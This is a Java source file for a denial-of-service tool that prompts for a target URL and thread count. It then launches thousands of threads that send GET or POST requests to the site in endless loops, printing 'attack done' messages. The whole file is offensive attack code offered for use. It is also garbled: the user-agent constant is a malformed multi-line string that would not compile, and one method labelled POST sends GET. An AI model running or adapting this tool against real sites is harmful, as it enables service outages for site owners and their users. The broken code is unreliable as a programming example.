

import java.io.*;

import java.net.*;

import java.util.Scanner;

import java.util.ArrayList;

import javax.net.ssl.HttpsURLConnection;

public class Dos implements Runnable {

    private final String USER_AGENT =   "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1

"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",

"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",

"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",

" Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",

"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",

"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; en) Presto/2.8.131 Version/11.11",

"Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11",

" Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",

" Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Maxthon 2.0)",

" Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; TencentTraveler 4.0)",

" Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)",

" Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; The World)",

" Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SE 2.X MetaSr 1.0; SE 2.X MetaSr 1.0; .NET CLR 2.0.50727; SE 2.X MetaSr 1.0)",

" Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)",

" Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser)",

" Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)",

"Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5",

"Mozilla/5.0 (iPod; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5",

"Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5",

" Mozilla/5.0 (Linux; U; Android 2.3.7; en-us; Nexus One Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",

" MQQBrowser/26 Mozilla/5.0 (Linux; U; Android 2.3.7; zh-cn; MB200 Build/GRJ22; CyanogenMod-7) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",

" Opera/9.80 (Android 2.3.4; Linux; Opera Mobi/build-1107180945; U; en-GB) Presto/2.8.149 Version/11.10",

" Mozilla/5.0 (Linux; U; Android 3.0; en-us; Xoom Build/HRI39) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13",

" Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en) AppleWebKit/534.1+ (KHTML, like Gecko) Version/6.0.0.337 Mobile Safari/534.1+",

" Mozilla/5.0 (hp-tablet; Linux; hpwOS/3.0.0; U; en-US) AppleWebKit/534.6 (KHTML, like Gecko) wOSBrowser/233.70 Safari/534.6 TouchPad/1.0",

" Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-1/20.0.019; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) BrowserNG/7.1.18124",

" Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0; HTC; Titan)",

" UCWEB7.0.2.37/28/999",

" NOKIA5700/ UCWEB7.0.2.37/28/999",

" Openwave/ UCWEB7.0.2.37/28/999",

" Mozilla/4.0 (compatible; MSIE 6.0; ) Opera/UCWEB7.0.2.37/28/999";

    private static int amount = 0;

    private static String url = "";

    int seq;

    int type;

    public Dos(int seq, int type) {

        this.seq = seq;

        this.type = type;

    }

    public void run() {

        try {

            while (true) {

                switch (this.type) {

                    case 1:

                        postAttack(Dos.url);

                        break;

                    case 2:

                        sslPostAttack(Dos.url);

                        break;

                    case 3:

                        getAttack(Dos.url);

                        break;

                    case 4:

                        sslGetAttack(Dos.url);

                        break;

                }

            }

        } catch (Exception e) {

        }

    }

    public static void main(String[] args) throws Exception {

        String url = "";

        int attakingAmoun = 0;

        Dos dos = new Dos(0, 0);

        Scanner in = new Scanner(System.in);

        System.out.print("Enter Url: ");

        url = in.nextLine();

        System.out.println("\n");

        System.out.println("Starting Attack to url: " + url);

        String[] SUrl = url.split("://");

        System.out.println("Checking connection to Site");

        if (SUrl[0] == "http" || SUrl[0].equals("http")) {

            dos.checkConnection(url);

        } else {

            dos.sslCheckConnection(url);

        }

        System.out.println("Setting DDoS By: Shadow Tak");

        System.out.print("Thread: ");

        String amount = in.nextLine();

        if (amount == null || amount.equals(null) || amount.equals("")) {

            Dos.amount = 2000;

        } else {

            Dos.amount = Integer.parseInt(amount);

        }

        System.out.print("method: ");

        String option = in.nextLine();

        int ioption = 1;

        if (option == "get" || option == "GET") {

            if (SUrl[0] == "http" || SUrl[0].equals("http")) {

                ioption = 3;

            } else {

                ioption = 4;

            }

        } else {

            if (SUrl[0] == "http" || SUrl[0].equals("http")) {

                ioption = 1;

            } else {

                ioption = 2;

            }

        }

        Thread.sleep(2000);

        System.out.println("Starting Attack");

        ArrayList<Thread> threads = new ArrayList<Thread>();

        for (int i = 0; i < Dos.amount; i++) {

            Thread t = new Thread(new Dos(i, ioption));

            t.start();

            threads.add(t);

        }

        for (int i = 0; i < threads.size(); i++) {

            Thread t = threads.get(i);

            try {

                t.join();

            } catch (Exception e) {

            }

        }

        System.out.println("Main Thread ended");

    }

    private void checkConnection(String url) throws Exception {

        System.out.println("Checking Connection");

        URL obj = new URL(url);

        HttpURLConnection con = (HttpURLConnection) obj.openConnection();

        con.setRequestMethod("GET");

        con.setRequestProperty("User-Agent", USER_AGENT);

        int responseCode = con.getResponseCode();

        if (responseCode == 200) {

            System.out.println("Connected to website");

        }

        Dos.url = url;

    }

    private void sslCheckConnection(String url) throws Exception {

        System.out.println("Checking Connection (ssl)");

        URL obj = new URL(url);

        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();

        con.setRequestMethod("GET");

        con.setRequestProperty("User-Agent", USER_AGENT);

        int responseCode = con.getResponseCode();

        if (responseCode == 200) {

            System.out.println("Connected to website");

        }

        Dos.url = url;

    }

    private void postAttack(String url) throws Exception {

        URL obj = new URL(url);

        HttpURLConnection con = (HttpURLConnection) obj.openConnection();

        con.setRequestMethod("POST");

        con.setRequestProperty("User-Agent", USER_AGENT);

        con.setRequestProperty("Accept-Language", "en-US,en;");

        String urlParameters = "out of memory";

        con.setDoOutput(true);

        DataOutputStream wr = new DataOutputStream(con.getOutputStream());

        wr.writeBytes(urlParameters);

        wr.flush();

        wr.close();

        int responseCode = con.getResponseCode();

        System.out.println("POST attack done!: " + responseCode + "Thread: " + this.seq);

    }

    private void getAttack(String url) throws Exception {

        URL obj = new URL(url);

        HttpURLConnection con = (HttpURLConnection) obj.openConnection();

        con.setRequestMethod("GET");

        con.setRequestProperty("User-Agent", USER_AGENT);

        int responseCode = con.getResponseCode();

        System.out.println("GET attack done!: " + responseCode + "Thread: " + this.seq);

    }

    private void sslPostAttack(String url) throws Exception {

        URL obj = new URL(url);

        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();

        con.setRequestMethod("GET");

        con.setRequestProperty("User-Agent", USER_AGENT);

        con.setRequestProperty("Accept-Language", "en-US,en;");

        String urlParameters = "out of memory";

        con.setDoOutput(true);

        DataOutputStream wr = new DataOutputStream(con.getOutputStream());

        wr.writeBytes(urlParameters);

        wr.flush();

        wr.close();

        int responseCode = con.getResponseCode();

        System.out.println("GET attack done!:" + responseCode + "Thread: " + this.seq);

    }

    private void sslGetAttack(String url) throws Exception {

        URL obj = new URL(url);

        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();

        con.setRequestMethod("GET");

        con.setRequestProperty("User-Agent", USER_AGENT);

        int responseCode = con.getResponseCode();

        System.out.println("GET attack done!: " + responseCode + "Thread: " + this.seq);

    }

}
